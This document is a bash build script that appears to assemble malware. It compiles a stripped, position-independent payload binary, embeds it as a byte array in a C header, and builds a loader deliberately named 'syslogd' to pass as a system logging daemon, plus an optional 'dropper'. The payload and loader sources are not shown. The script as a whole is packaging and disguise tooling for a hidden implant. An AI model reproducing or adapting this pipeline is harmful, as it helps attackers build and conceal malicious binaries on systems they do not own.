#!/bin/bash

set -e

# Paths
SRC_DIR="src"
INCLUDE_DIR="include"
BUILD_DIR="build"

# Output names
PAYLOAD_ELF="$BUILD_DIR/payload.elf"
PAYLOAD_HEADER="$INCLUDE_DIR/payload.h"
MAIN_BIN="$BUILD_DIR/syslogd"
DROPPER_BIN="$BUILD_DIR/dropper"

mkdir -p "$BUILD_DIR" "$INCLUDE_DIR"

echo "[+] Compiling payload.c -> $PAYLOAD_ELF"
gcc -m32 -Os -fPIC -nostdlib -static "$SRC_DIR/payload.c" -o "$PAYLOAD_ELF"
strip "$PAYLOAD_ELF"

echo "[+] Generating payload.h"
xxd -i "$PAYLOAD_ELF" > "$PAYLOAD_HEADER"
echo "size_t payload_size = sizeof(payload_elf);" >> "$PAYLOAD_HEADER"
sed -i 's/unsigned char payload_elf/static unsigned char payload_elf/' "$PAYLOAD_HEADER"

echo "[+] Compiling main loader -> $MAIN_BIN"
gcc -m32 -Os "$SRC_DIR/main.c" -I"$INCLUDE_DIR" -o "$MAIN_BIN"

if [[ -f "$SRC_DIR/dropper.c" ]]; then
  echo "[+] Compiling dropper -> $DROPPER_BIN"
  gcc -m32 -Os "$SRC_DIR/dropper.c" -I"$INCLUDE_DIR" -o "$DROPPER_BIN"
fi

echo "[+] Build complete. Binaries located in $BUILD_DIR"
